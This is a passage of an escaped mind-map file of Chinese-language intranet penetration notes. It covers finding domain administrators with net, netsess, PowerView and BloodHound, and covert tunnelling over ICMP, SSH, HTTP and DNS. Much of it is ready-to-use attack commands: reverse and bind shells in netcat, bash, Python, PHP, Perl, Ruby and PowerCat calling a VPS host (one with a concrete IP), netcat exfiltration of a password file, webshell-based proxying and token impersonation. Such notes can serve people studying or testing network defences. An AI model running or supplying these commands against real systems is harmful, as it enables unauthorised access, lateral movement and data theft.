      &lt;node TEXT=&quot;Empire的user_hunter模块&quot; ID=&quot;36a1735b90a4a1145&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;usemodule situational_awareness/network/powerview/user_hunter  可用于查找域管理员登陆的机器 &quot; ID=&quot;2e21735b90cedf03e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;查找域管理进程&quot; ID=&quot;2481735b921d070b3&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;本机检查 &quot; ID=&quot;3431735b929387142&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;net group &amp;quot;Domain Admins&amp;quot; /domain&quot; ID=&quot;33c1735b93006015&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;tasklist /svc&quot; ID=&quot;2821735b933568078&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;查找域控制器的域用户会话&quot; ID=&quot;1911735b937eaf07c&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;查找域控制器列表：net group &amp;quot;Domain Controllers&amp;quot; /domain&quot; ID=&quot;2e71735b93a53f092&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;查找域管理员列表：net group &amp;quot;Domain Admins&amp;quot; /domain&quot; ID=&quot;fb1735b945ff8001&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;查找所有活动域的会话列表：netsess -h [下载地址：http://www.joeware.net/freetools/tools/netsess/index.htm]&quot; ID=&quot;1ee1735b94b331185&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;交叉引用域管理员列表与活动会话列表&quot; ID=&quot;2b91735b9dc330089&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;下列脚本可以快速使用netsess.exe的windows命令行：for /F %i (dcs.txt) do @echo [+] Querying DC %i &amp;amp;&amp;amp; @netsess -h %i 2&amp;gt;null &amp;gt; sessions.txt &amp;amp;&amp;amp; FOR /F %a in (admins.txt) do @type sessions.txt | @findstr /I %a &quot; ID=&quot;3181735b9f1b28199&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;Get Domain Admin(GDA)批处理脚本[下载地址：https://github.com/nullbind/Other-Projects/tree/master/GDA]&quot; ID=&quot;1c51735ba7dcb80ca&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;查询远程系统中运行的任务&quot; ID=&quot;2f01735bc115f7157&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;for /F %i in (ips.txt) do @echo [+] %i &amp;amp;&amp;amp; @tasklist /V /S %i /U user /P password 2&amp;gt;Nul &amp;gt; output.txt &amp;amp;&amp;amp; for /F %n in (names.txt) do @type output.txt | findstr %n &amp;gt; NUL &amp;amp;&amp;amp; echo [!] %n was found runnning a process on %i &amp;amp;&amp;amp; pause&quot; ID=&quot;3501735bc195c005c&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;扫描远程系统的NetBIOS信息&quot; ID=&quot;2711735bc3a3400aa&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;for /F %i in (ips.txt) do @echo [+] checking %i &amp;amp;&amp;amp; nbtstat -A %i 2&amp;gt;NUL &amp;gt; nbsessions.txt &amp;amp;&amp;amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &amp;gt; NUL &amp;amp;&amp;amp; echo [!] %n was found logged into %i&quot; ID=&quot;22a1735bc3e3f6088&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;将域机器列表写入ips.txt ,收集到的域管理员列表写入admins.txt&quot; ID=&quot;2721735bd117490de&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;for /F %i in (ips.txt) do @echo [+] checking %i &amp;amp;&amp;amp; nbtscan -f %i 2&amp;gt;NUL &amp;gt; nbsessions.txt &amp;amp;&amp;amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &amp;gt; NUL &amp;amp;&amp;amp; echo [!] %n was found logged into %i&quot; ID=&quot;33d1735bd1f181078&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;域管理员模拟方法&quot; ID=&quot;b1735bd329c7165&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;如果已经拥有一个meterpreter会话，可以使用Incognito来模拟 域管理员或者添加一个域管理员，通过尝试遍历系统中所有可用的授权令牌来添加新的管理员。&quot; ID=&quot;2e1735bd5e690035&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;利用Powershell收集域信息&quot; ID=&quot;3001735bd73d680e1&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;powersploit\recon\powerview.ps1&quot; ID=&quot;3c31735bd77428034&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;Get-NetDomain: 获取当前用户所在域名称&quot; ID=&quot;9a1735bdef9170f&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-NetUser:获取所有用户的详细信息&quot; ID=&quot;1de1735bdf4dd7169&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-NetDomainController：获取所有域控制器的信息&quot; ID=&quot;3111735bdf6fbf05a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-NetComputer：获取域内所有机器的详细信息&quot; ID=&quot;3a81735bdf89bf0ab&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-NetOU：获取域内的OU信息&quot; ID=&quot;2db1735bdfa06716c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-NetGroup：获取所有域内组和组成员的信息&quot; ID=&quot;27a1735bdfcc38036&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-NetFileServer：根据SPN获取域内使用的文件服务器信息&quot; ID=&quot;1721735bdfe7a717&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-NetShare：获取域内所有的网络共享信息&quot; ID=&quot;2251735bdfff4f171&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-NetSession：获取指定服务器的会话&quot; ID=&quot;51735be0139f12f&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-Netprocess：获取远程主机的进程&quot; ID=&quot;3a21735be02477134&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-UserEvent：获取指定用户的日志&quot; ID=&quot;2821735be04b230ca&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-ADObject：获取活动目录对象&quot; ID=&quot;1f1735be0696f104&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Get-DomainPolicy：获取域默认策略或域控制器策略&quot; ID=&quot;2ec1735be07a9f12c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Invoke-UserHuter：获取域用户登陆的计算机信息及该用户是否有本地管理员权限 &quot; ID=&quot;3a1735be096370c9&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Invoke-ProcessHunter：通过查询 域内所有机器 进程找到特定用户&quot; ID=&quot;1371735be0bbe703c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Invoke-userEventHunter：根据用户日志查询 某域用户登陆过哪些域机器&quot; ID=&quot;1271735be0dc87118&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;域分析工具BloodHound&quot; ID=&quot;a51735be5b3c701&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;配置环境[下载地址：https://github.com/BloodHoundAD/BloodHound/]&quot; ID=&quot;661735be6a94710f&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;采集数据 &quot; ID=&quot;15d1735be707d807c&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;bloodhound分析时需要调用活动目录的三条信息&quot; ID=&quot;2c61735be750d803f&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;哪些 用户登陆了哪些机器 &quot; ID=&quot;f41735be79e500e1&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;哪些用户拥有管理员权限 &quot; ID=&quot;3841735be7b8b7105&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;哪些用户和组属于哪些组&quot; ID=&quot;1721735be7cff0158&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;SharpHound.exe -c all&quot; ID=&quot;33e1735beaf210001&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;导入数据&quot; ID=&quot;21d1735becd8a015f&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;上传SharpHound.exe生成的zip文件&quot; ID=&quot;22b1735becf25702c&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;查询数据&quot; ID=&quot;4a1735bedf5990a7&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;Find all Domain Admins  选择需要查询的域名，查找 所有域管理员&quot; ID=&quot;1a61735bee0308052&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Find Shortest Paths to domain Admins 查找到达域管理员的最短路径&quot; ID=&quot;3741735bee8178033&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
&lt;/node&gt;
&lt;node TEXT=&quot;三、隐藏通信隧道技术&quot; ID=&quot;2c11735a6a70aa175&quot; STYLE=&quot;bubble&quot; POSITION=&quot;right&quot;&gt;
  &lt;node TEXT=&quot;判断内网联通性&quot; ID=&quot;18e1735c131cd0136&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;ICMP协议：ping&quot; ID=&quot;1c91735c13330704c&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;TCP协议：nc\ncat&quot; ID=&quot;551735c13568f031&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;HTTP协议：curl\wget&quot; ID=&quot;1111735c13822f0fa&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;DNS协议：nslookup\dig&quot; ID=&quot;2221735c13a2470b6&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;nslookup www.baidu.com vps_ip&quot; ID=&quot;3d51735c13edc7033&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;dig @vps_ip www.baidu.com A&quot; ID=&quot;1221735c141cc2082&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;网络层隧道技术&quot; ID=&quot;61735c35d44b0fd&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;IPv6隧道&quot; ID=&quot;2aa1735c35ecb509&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;工具：socat、6tunnel、nt6tunnel等&quot; ID=&quot;1e11735c3607a4162&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;ICMP隧道&quot; ID=&quot;3e21735c3decb20fc&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;icmpsh [下载地址：https://github.com/inquisb/icmpsh.git]&quot; ID=&quot;1d51735c3dff53137&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;安装python-impacket类库：apt-get install python-impacket  关闭系统的ICMP应答：sysctl -w net.ipv4.icmp_echo_ignore_all=1&quot; ID=&quot;31c1735c3e812b096&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;PingTunnel[下载地址：http://freshmeat.sourceforge.net/projects/ptunnel/]&quot; ID=&quot;f917361d1a72c0d&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;目标机器[192.168.1.4\1.1.1.10]运行：ptunnel -x shuteer  已控制机器[192.168.1.1]执行：ptunnel -p 192.168.1.4 -lp 1080 -da 1.1.1.11 -dp 3389 -x shuteer   &quot; ID=&quot;23317361d6b48401a&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-x 指定ICMP连接的密码；-lp 指定要监听的本地TCP端口；-da 指定要转发的目标机器IP地址；-dp 指定要转发的目标机器TCP端口；-p 指定ICMP隧道另一端IP地址&quot; ID=&quot;23d17361da9aaa0bc&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;传输层隧道技术&quot; ID=&quot;29f17361dc67030d6&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;lcx端口转发&quot; ID=&quot;3dc17361dc9db30d5&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;内网端口转发&quot; ID=&quot;16517361dcc92c166&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;将目标机器3389端口转发到公网VPS4444端口：lcx.exe -slave VPS_IP 4444 127.0.0.1 3389  在VPS上执行：lcx.exe -listen 4444 5555  本地mstsc连接VPS_IP:5555端口即目标机器 的3389&quot; ID=&quot;15a17361de0f4408b&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;本地端口映射&quot; ID=&quot;12017361dfdf4d133&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;部分端口[如3389]无法通过防火墙：lcx.exe -tran 53 127.0.0.1 3389&quot; ID=&quot;a117361dffd740ce&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;netcat&quot; ID=&quot;2db17361e33cfc074&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;文件传输&quot; ID=&quot;18617361e355b313c&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;VPS上运行：nc -lv 12345 &amp;gt; 1.txt  目标机器上运行：nc -vn VPS_IP 333 &amp;lt; pass.txt  -q 1&quot; ID=&quot;8217361e42d3a12c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;正向Shell&quot; ID=&quot;20b17361e75dba067&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;目标机器上执行 [Linux]nc -lvvp 4444 -e /bin/sh   [Windows] nc -lvvp 4444 -e c:\windows\system32\cmd.exe   本地执行：nc 目标机器外网IP 4444&quot; ID=&quot;6717361e776b313d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;反向Shell&quot; ID=&quot;32d17361e9d539089&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;VPS上执行：nc -lvvp 9999 目标主机上执行：[Linux] nc VPS_ip 9999 -e /bin/sh [Windows] nc VPS_IP 9999 -e c:\windows\system32\cmd.exe &quot; ID=&quot;c017361e9f282006&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;目标主机没有NC时获取反向Shell&quot; ID=&quot;d117361eb9192106&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Python&quot; ID=&quot;2b117361ebe3a914d&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;python -c &amp;apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;VPS_ip&amp;quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;apos;&quot; ID=&quot;2c217361ebf3cb13a&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;Bash&quot; ID=&quot;28a17361ed609114a&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/VPS_IP/9999 0&amp;gt;&amp;amp;1&quot; ID=&quot;3dc17361ed88e916&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;PHP&quot; ID=&quot;25a17361ef349a00c&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;php -r &amp;apos;$sock=fsockopen(&amp;quot;VPS_ip&amp;quot;,9999);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;apos;&quot; ID=&quot;14217361ef3c8300c&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;Perl&quot; ID=&quot;36e17361ef72410a5&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;perl -e &amp;apos;use Socket;$i=&amp;quot;VPS_ip&amp;quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);&#125;;&amp;apos;&quot; ID=&quot;24b17361ef831911b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;Ruby&quot; ID=&quot;3e417361efff89004&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;ruby -rsocket -e&amp;apos;f=TCPSocket.open(&amp;quot;VPS_ip&amp;quot;,9999).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&amp;apos;&quot; ID=&quot;3d517361f03df900c&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;内网代理&quot; ID=&quot;20f17361f09ce814e&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;VPS上执行：nc -lvvp 3333 二级内网机器：nc -lvvp 4444 -e /bin/sh 边界WEB服务器：nc -v VPS_ip 3333 -c &amp;quot;nc -v 二级内网机器IP 4444&amp;quot;  &quot; ID=&quot;1a517361f0e2590f&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;PowerCat[下载地址：https://github.com/besimorhino/powercat.git ]&quot; ID=&quot;e517361f5b77902&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;导入：Import-Module .\powercat.ps1&quot; ID=&quot;2b317361f5d65817e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;nc正向连接powercat&quot; ID=&quot;15817361f7b7500bb&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;目标机器执行：powershell.exe -c &amp;quot;&amp;amp; &#123;Import-module .\powercat.ps1;powercat -l -p 888 -e cmd.exe -V&#125;&amp;quot;  本地执行：nc 目标机器IP 888&quot; ID=&quot;10f17361f7e11014a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;nc反向连接powercat&quot; ID=&quot;2e917361fe772818&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;VPS执行：nc -lvvp 4444 目标机器执行：powershell.exe -c &amp;quot;&amp;amp; &#123;Import-module .\powercat.ps1;powercat -c VPS_ip -p 4444 -v -e cmd.exe&#125;&amp;quot;&quot; ID=&quot;c117361fe9f990c9&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;通过PowerCat传输文件&quot; ID=&quot;aa1736200da5b0c9&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;目标机器执行：powershell.exe -c &amp;quot;&amp;amp; &#123;Import-module .\powercat.ps1;powercat -l -p 9999 -of test.txt -v &#125;&amp;quot;  本地执行：powershell.exe -c &amp;quot;&amp;amp; &#123;Import-module .\powercat.ps1;powercat -c aaa -p 9999 -i c:\test.txt -v &#125;&amp;quot;&quot; ID=&quot;1f517362011dde11d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;通过PowerCat生成Payload&quot; ID=&quot;2f4173620a03110c&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;正向Shell&quot; ID=&quot;9f173620a34470dc&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;本地生成Payload：powershell.exe -c &amp;quot;&amp;amp; &#123;Import-module .\powercat.ps1;powercat -l -p 8000 -e cmd.exe -v -g &amp;gt;&amp;gt; shell.ps1&#125;&amp;quot; 上传至目标执行：powershell.exe -c &amp;quot;.\shell.ps1&amp;quot; 本地执行：powershell.exe -c &amp;quot;&amp;amp; &#123;Import-module .\powercat.ps1;powercat -c 127.0.0.1 -p 8000 -v&#125;&amp;quot;&quot; ID=&quot;1d6173620bfbae0aa&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;VPS执行：nc -lvvp 4444  本地生成Payload：powershell.exe -c &amp;quot;&amp;amp; &#123;Import-module .\powercat.ps1;powercat -c 118.24.74.232 -p 4444 -e cmd.exe -v -g &amp;gt;&amp;gt; shell.ps1&#125;&amp;quot; 上传至目标执行：powershell.exe -c &amp;quot;.\shell.ps1&amp;quot; &quot; ID=&quot;1da173620f5b950a6&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;PowerCat DNS隧道&quot; ID=&quot;2d31736216944d134&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;VPS安装dnscat[下载地址：https://github.com/iagox86/dnscat2.git ] &quot; ID=&quot;16a1736216dc2f192&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;git clone https://github.com/iagox86/dnscat2.git&quot; ID=&quot;2411736219d5a5189&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;cd dnscat2/server&quot; ID=&quot;3d71736219f2f502b&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;yum install -y ruby&quot; ID=&quot;1a6173621a0a1f0b5&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;gem install bundler&quot; ID=&quot;88173621a21ee038&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;bundler install&quot; ID=&quot;38b173621a32c507d&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;ruby dnscat2.rb ttpowercat.test -e open --no-cache&quot; ID=&quot;cd173621a3f0e0d7&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;目标机器执行：powershell.exe -c &amp;quot;&amp;amp; &#123;Import-module .\powercat.ps1;powercat -c VPS_IP -p 53 -dns ttpowercat.test -e cmd.exe&#125;&amp;quot;&quot; ID=&quot;1cf173621af5cd01d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;通过PowerCat作为内网代理&quot; ID=&quot;348173621c184602a&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;二级内网机器执行：powershell.exe -c &amp;quot;&amp;amp; &#123;Import-module .\powercat.ps1;powercat -l -p 9999 -e cmd.exe -v&#125;&amp;quot;&quot; ID=&quot;3cc173621c4324001&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;边界机器执行：powershell.exe -c &amp;quot;&amp;amp; &#123;Import-module .\powercat.ps1;powercat -l -v -p 8000 -r tcp:二级内网机器IP:9999&#125;&amp;quot;&quot; ID=&quot;bc173621e7e9d011&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;VPS执行：nc 边界机器外网IP 8000 -vv&quot; ID=&quot;368173621d5ad50d5&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;应用层隧道技术&quot; ID=&quot;27b17362223e6d164&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;SSH协议&quot; ID=&quot;12e17362225f7d0cd&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;常见参数说明&quot; ID=&quot;2217362227895093&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;-C 压缩传输，提高传输速度&quot; ID=&quot;2d41736224507d149&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-f  将SSH传输转入后台执行，不占用当前Shell&quot; ID=&quot;36a1736224802c04b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-N 建立 静默连接&quot; ID=&quot;df1736224c29d198&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-g 允许远程主机连接本地用于转发的端口&quot; ID=&quot;5a1736224e52c052&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-L 本地端口转发&quot; ID=&quot;15217362252552119&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-R 远程端口转发&quot; ID=&quot;2331736225433b06b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-D 动态转发（Socks代理）&quot; ID=&quot;3c117362257475177&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-P 指定SSH端口&quot; ID=&quot;1861736225b6be10b&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;本地转发&quot; ID=&quot;2351736225e50b025&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;外网边界服务器将内网机器3389端口转发出来&quot; ID=&quot;36d1736225f9e512b&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;VPS上执行：ssh -CFNg -L 1153:内网机器IP:3389 root@外网边界服务器IP&quot; ID=&quot;2291736227ef350a9&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;本地访问VPS:1153端口，即内网机器3389&quot; ID=&quot;3e717362292a7b035&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;远程转发&quot; ID=&quot;cb17362297e6d063&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;内网边界服务器执行：ssh -CfNg -R 1153:内网机器IP:3389 root@VPS_IP&quot; ID=&quot;c517362298d9517c&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;本地访问VPS:1153端口，即内网机器3389&quot; ID=&quot;5b173622be38e0b7&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;动态转发&quot; ID=&quot;39c173622c384c041&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;在VPS上执行命令：ssh -CfNg -D 7000 root@外网边界服务器&quot; ID=&quot;2e173622c4f0d15f&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;本地配置Proxifier设置VPS_IP:7000端口Socks5代理&quot; ID=&quot;38a173622d230516f&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;HTTP/HTTPS协议&quot; ID=&quot;64173623195fd054&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;常见工具：reDuh、reGeorg、meterpreter、tunna等&quot; ID=&quot;6a1736231af4c0b1&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;reGeorg&quot; ID=&quot;bf173623283a301a&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;上传对应版本的webshell&quot; ID=&quot;16e1736232f6bc01b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;python reGeorgSocksProxy.py -u webshell地址 -p 9999&quot; ID=&quot;a91736232a734195&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;本地配置Proxifier设置127.0.0.1:9999端口Socks5代理&quot; ID=&quot;b8173623349e4076&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;DNS协议&quot; ID=&quot;3c11736233d9430db&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;dnscat2 &quot; ID=&quot;1691736233f44508&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;太复杂了，自己百度&quot; ID=&quot;11e17362350d5b189&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
